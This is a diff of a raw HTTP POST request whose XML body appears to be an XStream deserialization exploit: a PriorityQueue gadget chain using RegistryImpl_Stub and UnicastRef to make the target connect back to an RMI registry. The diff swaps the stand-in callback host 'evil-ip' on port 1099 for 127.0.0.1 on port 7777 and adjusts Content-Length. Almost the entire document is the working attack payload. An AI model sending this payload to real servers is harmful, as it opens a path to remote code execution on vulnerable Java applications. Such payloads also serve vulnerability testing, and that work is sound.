@@ -7,7 +7,7 @@ Host: cqq.com:8888
 Connection: close
 Cookie: JSESSIONID=CBDECCC9308191A35EE694BE7373EDB1
 Content-Type: application/xml
-Content-Length: 3105
+Content-Length: 3107
 
 <java.util.PriorityQueue serialization='custom'>
     <unserializable-parents/>
@@ -43,8 +43,8 @@ Content-Length: 3105
                                         <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                             <java.rmi.server.RemoteObject>
                                                 <string>UnicastRef</string>
-                                                <string>evil-ip</string>
-                                                <int>1099</int>
+                                                <string>127.0.0.1</string>
+                                                <int>7777</int>
                                                 <long>0</long>
                                                 <int>0</int>
                                                 <long>0</long>
